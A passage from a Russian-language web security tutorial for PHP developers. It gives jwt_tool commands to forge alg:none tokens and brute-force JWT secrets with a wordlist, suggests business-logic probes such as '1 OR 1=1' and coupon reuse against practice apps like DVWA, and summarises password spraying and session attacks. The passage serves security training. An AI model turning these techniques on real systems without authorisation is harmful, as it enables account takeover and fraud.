# 2. POST с токеном и паролем
```

### Упражнение 3: JWT.io — практика с токенами

```bash
# Инструменты для практики JWT:

# jwt_tool установка
pip3 install jwt-tool
# или
git clone https://github.com/ticarpi/jwt_tool && cd jwt_tool && pip3 install -r requirements.txt

# Практика 1: Декодировать токен
python3 jwt_tool.py eyJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoidXNlciJ9.SIGNATURE

# Практика 2: Создать alg:none токен
python3 jwt_tool.py eyJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoidXNlciJ9.SIGNATURE -X a

# Практика 3: Брутфорс секрета
python3 jwt_tool.py TOKEN -C -d /usr/share/wordlists/rockyou.txt

# Онлайн практика:
# https://jwt.io — декодирование/кодирование
# https://portswigger.net/web-security/jwt — лабораторные работы
```

### Упражнение 4: Самостоятельный поиск BLV

Возьмите любое PHP/Laravel приложение (можно DVWA, Mutillidae или своё):

1. Найдите любую форму с числовым полем (количество, сумма)
2. Попробуйте передать: 0, -1, 99999, 1.0000001, "1 OR 1=1"
3. Найдите форму с купоном/промокодом — примените дважды
4. Найдите любой многошаговый процесс — попробуйте пропустить шаг

Задокументируйте каждый тест: URL, метод, параметры, результат.

---

## Итоги главы

```
КЛЮЧЕВЫЕ ВЫВОДЫ:
==================
• Брутфорс ≠ тупой перебор. Password spraying — умный подход
  с учётом lockout policy
• JWT уязвимости критичны — alg:none и key confusion дают admin
• Session management — часто упускаемый вектор атаки
• Business Logic уязвимости требуют понимания бизнеса,
  сканеры их не найдут
• OAuth реализации редко идеальны — проверяйте все параметры

PHP-РАЗРАБОТЧИК ЗНАЕТ:
  - Как работают сессии в PHP → видит session fixation
  - Как устроены формы → понимает token manipulation
  - Как работает код оформления заказа → находит race conditions
  Это ваше преимущество!
```

